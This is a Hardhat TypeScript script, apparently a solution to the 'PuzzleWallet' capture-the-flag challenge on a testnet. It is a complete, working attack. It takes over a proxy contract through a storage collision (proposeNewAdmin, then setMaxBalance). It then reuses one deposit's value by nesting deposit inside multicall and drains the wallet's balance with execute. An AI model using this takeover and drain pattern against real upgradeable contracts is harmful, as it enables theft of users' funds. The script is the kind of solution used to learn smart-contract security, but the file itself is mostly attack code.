import { ethers, upgrades } from "hardhat";
import {Contract, parseEther } from "ethers";
import  PuzzleProxy  from "./../artifacts/contracts/PuzzleProxy.sol/PuzzleProxy.json";
import  PuzzleWallet from "./../artifacts/contracts/PuzzleWallet.sol/PuzzleWallet.json";

require("dotenv").config();

let puzzleProxy: Contract;
let puzzleWallet: Contract;

async function main() {
    const [attacker] = await ethers.getSigners();
    const proxyAdminAddress = "0xE14D3C15643c232c8A698338d38c42E25322C0A9";
    console.log("Attackers account:", attacker.address);

    puzzleProxy = await ethers.getContractAt(PuzzleProxy.abi, proxyAdminAddress);
    const admin = await puzzleProxy.admin();
    console.log("Proxy admin", admin);

    puzzleWallet = await ethers.getContractAt(PuzzleWallet.abi, proxyAdminAddress);
    const owner = await puzzleWallet.owner();

    const currentImplAddress = await upgrades.erc1967.getImplementationAddress(proxyAdminAddress);

    console.log("Implementation: ", currentImplAddress)
    console.log("Implementation owner", owner);

    let tx = await puzzleProxy.proposeNewAdmin(attacker);
    await tx.wait();

    tx = await puzzleWallet.addToWhitelist(attacker);
    await tx.wait();

    const data1 = puzzleWallet.interface.encodeFunctionData("deposit");
    const data2 = puzzleWallet.interface.encodeFunctionData("multicall", [[data1]]);

    tx = await await puzzleWallet.multicall([data1, data2], {
      value: parseEther("0.001"),
    });
    await tx.wait();

    tx = await puzzleWallet.execute(attacker.address, parseEther("0.002"), "0x");
    await tx.wait();

    tx = await puzzleWallet.setMaxBalance(attacker);
    await tx.wait();
    
    const newAdmin = await puzzleProxy.admin();
    console.log("New proxy admin", newAdmin);

    const provider = ethers.getDefaultProvider(11155111); 
    const balance = await provider.getBalance(proxyAdminAddress);

    console.log(balance);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});